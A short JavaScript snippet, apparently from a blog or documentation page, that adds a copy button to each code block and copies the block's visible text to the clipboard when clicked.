  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>